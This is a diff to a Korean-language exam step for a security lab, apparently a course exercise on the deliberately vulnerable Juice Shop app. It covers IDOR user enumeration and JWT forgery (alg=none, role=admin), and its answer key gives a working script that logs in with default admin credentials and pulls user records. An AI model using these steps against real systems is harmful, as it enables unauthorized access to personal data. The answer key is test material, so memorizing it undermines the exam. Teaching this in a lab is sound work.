@@ -105,39 +105,50 @@ steps:
     instruction: |
       ## 🎯 챌린지 3 (30점) — IDOR + JWT
 
-      JuiceShop 의 IDOR 시퀀스 + JWT 변조 시도.
+      JuiceShop 의 IDOR 시퀀스 + JWT 변조 시도. 2 단계 — (a) login 으로 JWT 획득 →
+      (b) JWT 로 `/api/Users/{id}` 시퀀스 → (c) JWT payload 변조 시도.
 
-      ## 💻 실행 명령
+      ## 💻 실행 가이드 (학생이 직접 작성)
 
-      ```bash
-      ssh 6v6-attacker '
-      for id in 1 2 3 4 5; do
-        echo "=== user $id ==="
-        curl -s -H "Host: juice.6v6.lab" "http://10.20.30.1/api/Users/$id" | head -c 200
-        echo
-      done
-      '
-      ```
+      - JuiceShop default 자격: `admin@juice-sh.op` / `admin123` (또는 무작위 가입)
+      - login endpoint: `POST /rest/user/login` (JSON body) → `authentication.token`
+      - IDOR 시퀀스: `GET /api/Users/{1..5}` + Authorization header 의 Bearer token
+      - JWT 변조: header 의 `alg` 를 `none` 으로 변조 + payload 의 `role` 을 `admin`
+        으로 변경 → 서명 우회 검증
 
-      ## 📋 평가
+      ## 📋 평가 (각 6점)
 
-      1. 5 user IDOR
-      2. 응답 데이터 비교 (다른 user 의 PII 누출 검출)
-      3. JWT 변조 + admin 우회 시도
-      4. 권한 검증 우회 분석
-      5. 운영 권장 (인증 미들웨어 + RBAC)
-    hint: IDOR + JWT
+      1. login 으로 JWT 획득 + token 의 3 segment (header.payload.sig) 디코드
+      2. 5 user `/api/Users/{id}` 응답 비교 — *다른 user 의 PII* 누출 검출
+      3. JWT 변조 (alg=none 또는 weak secret) 시도 + 결과 분석
+      4. 인증 우회 vs 권한 검증 우회 의 차이 인지
+      5. 운영 측 권장 — 인증 미들웨어 + RBAC + JWT 서명 검증 의 *함께* 적용
+
+      ## 비정상 시 대응
+
+      - **401 UnauthorizedError** — Authorization header 누락 또는 token expired.
+        login 재시도 → 새 token.
+      - **403** — ModSec 가 JWT payload 의 SQL/XSS 키워드 차단. payload 인코딩
+        (base64 standard vs url-safe) 확인.
+    hint: |
+      1) login API → JWT token 획득  2) `Authorization: Bearer <token>` 로 IDOR
+      3) JWT 의 alg=none 변조 시도. 시험 — 답 직접 작성.
     category: exam
     points: 30
     answer: |
       ssh 6v6-attacker '
+      TOK=$(curl -s -X POST -H "Content-Type: application/json" -H "Host: juice.6v6.lab" "http://10.20.30.1/rest/user/login" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" | python3 -c "import sys,json;print(json.load(sys.stdin)[\"authentication\"][\"token\"])")
+      echo "token segments:"; echo "$TOK" | tr "." "\n" | head -2
       for id in 1 2 3 4 5; do
         echo "=== user $id ==="
-        curl -s -H "Host: juice.6v6.lab" "http://10.20.30.1/api/Users/$id" | head -c 200
+        curl -s -H "Host: juice.6v6.lab" -H "Authorization: Bearer $TOK" "http://10.20.30.1/api/Users/$id" | head -c 200
         echo
       done
       '
-    answer_detail: 5 user IDOR + JWT 변조.
+    answer_detail: |
+      JWT login → token 의 3 segment → 5 user IDOR (Bearer header). admin token
+      이라 5 user 모두 PII 노출 — *admin role 의 권한 분리 결함* 확인. alg=none
+      변조 시 Juice Shop 버전에 따라 우회 가능/차단.
     verify:
       type: output_contains
       expect: user
